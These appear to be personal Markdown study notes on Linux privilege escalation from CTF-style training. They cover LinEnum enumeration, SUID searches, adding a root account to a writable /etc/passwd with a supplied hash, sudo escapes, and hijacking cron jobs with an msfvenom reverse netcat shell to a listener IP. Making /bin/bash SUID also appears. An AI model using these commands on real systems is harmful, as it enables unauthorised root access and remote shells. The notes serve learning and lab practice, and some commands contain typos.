# Priv Esc

* Horizontal -> esc same user to user
* Vertical -> esc to admin 

# Enumerate esc (Sending to target)

* There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using `python3 -m http.server 8000` [1]. Then using  `wget localip:8000/path`  on the target machine, and your local IP, you can grab the file from your local machine [2]. Then make the file executable using the command "chmod +x FILENAME.sh".

* Create a file .sh chmod -x file.sh then run

# Usage 

```

    -k Enter keyword
    -e Enter export location
    -t Include thorough (lengthy) tests
    -s Supply current user password to check sudo perms (INSECURE)
    -r Enter report name
    -h Displays this help text

Running with no options = limited scans/no output file

    -e Requires the user enters an output location i.e. /tmp/export. If this location does not exist, it will be created.
    -r Requires the user to enter a report name. The report (.txt file) will be saved to the current working directory.
    -t Performs thorough (slow) tests. Without this switch default 'quick' scans are performed.
    -s Use the current user with supplied password to check for sudo permissions - note this is insecure and only really for CTF use!
    -k An optional switch for which the user can search for a single keyword within many files (documented below).

```

# Understanding LinEnum Output

```The LinEnum output is broken down into different sections, these are the main sections that we will focus on:

Kernel Kernel information is shown here. There is most likely a kernel exploit available for this machine.

Can we read/write sensitive files: The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn't usually be able to, to be able to write to sensitive files.

SUID Files: The output for SUID files is shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges. 

Crontab Contents: The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here.
```
# Finding SUID Binaries (manually)
```
We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: `find / -perm -u=s -type f 2>/dev/null` to search the file system for SUID/GUID files. Let's break down this command.

find - Initiates the "find" command

/ - Searches the whole file system

-perm - searches for files with specific permissions

-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form

-type f - Only search for files

2>/dev/null - Suppresses errors 
```
# Expoiting Writable user Acct

`find usr/grp with root priv`
```
Understanding /etc/passwd format

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

    test:x:0:0:root:/root:/bin/bash

[as divided by colon (:)]

    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    Group ID (GID): The primary group ID (stored in /etc/group file)
    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

How to exploit a writable /etc/passwd

It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!



Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]"

```
`adding new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash to /etc/passwd will create a new root acct`

# Escaping VI or Sudo allowed apps

* Always check what is allowed `sudo -l`
* check gtfobins.com for exploits

# Exploiting Crontab
```
Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
# = ID
m = Minute
h = Hour
dom = Day of the month
mon = Month
dow = Day of the week
user = What user the command will run as
command = What command should be run
For Example,
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

`cat /etc/crontab`  to view what cron jobs are scheduled.

Generate payload on hostmachine with `msfvenom -p cmd/unix/reverse_netcat lhost=10.6.33.220 lport=8888 R`

Replace crontab content `echo [MSFVENOM OUTPUT] > autoscript.sh`

WAit for reverse shell listen with `nc -lvp 8888`

## Make /bin/bash exec

```
chmod 777 backup.sh 
echo 'chmod 4777 /bin/bash' >> backup.sh
bash -p
```

## find files in time period

```                             Low                             High
find  / -type f -newermt 'YYYY-MM-DD HH:MM:SS" ! -newermt 'YYYY-MM-DD HH:MM:SS" -ls 2>dev/null
```

# Expoiting Path

* kenobi

* Using suid scripts to gain root access with $PATH variable

